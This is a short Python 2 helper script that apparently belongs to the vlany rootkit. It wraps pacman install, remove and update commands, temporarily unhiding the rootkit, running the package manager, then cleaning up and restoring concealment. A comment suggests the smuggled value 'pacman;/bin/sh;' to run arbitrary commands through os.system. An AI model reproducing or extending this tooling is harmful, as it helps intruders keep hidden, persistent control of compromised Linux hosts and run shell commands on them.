#!/usr/bin/env python2

# this is the intial script, so i'm going to comment only this one.
# i'm trying to keep this robust so you can easily add your own
# scripts for other things you might want to do.

import vlany
import os
import sys

if not len(sys.argv) >= 2: quit()

# configurable variables... arguments can have spaces in them
# i.e. install_args = [pkg_man_name, "--force-yes --yes"]
# you can execute whatever you want..i just use os.system for sake of ease
# i.e. pkg_man_name = "pacman;/bin/sh;"
pkg_man_name = "pacman"
install_args = [pkg_man_name, "-S"]
rm_args = [pkg_man_name, "-Rs"]
u_args = [pkg_man_name, "-Syy"]

if __name__ == "__main__":
    o_gid = vlany.getgid()
    o_dir = vlany.cwd()
    vlany.relocate("/")
    vlany.unhide(0)

    if sys.argv[1] == "install":
        vlany.install_pkg(install_args[0], install_args[1], sys.argv[2])
    elif sys.argv[1] == "remove":
        vlany.rm_pkg(rm_args[0], rm_args[1], sys.argv[2])
    elif sys.argv[1] == "update":
        vlany.update_pkg_man(u_args[0], u_args[1])
    else:
        print("[-] {0} is not an acceptable operation argument".format(sys.argv[1]))

    vlany.clean(o_gid)
    vlany.relocate(o_dir)
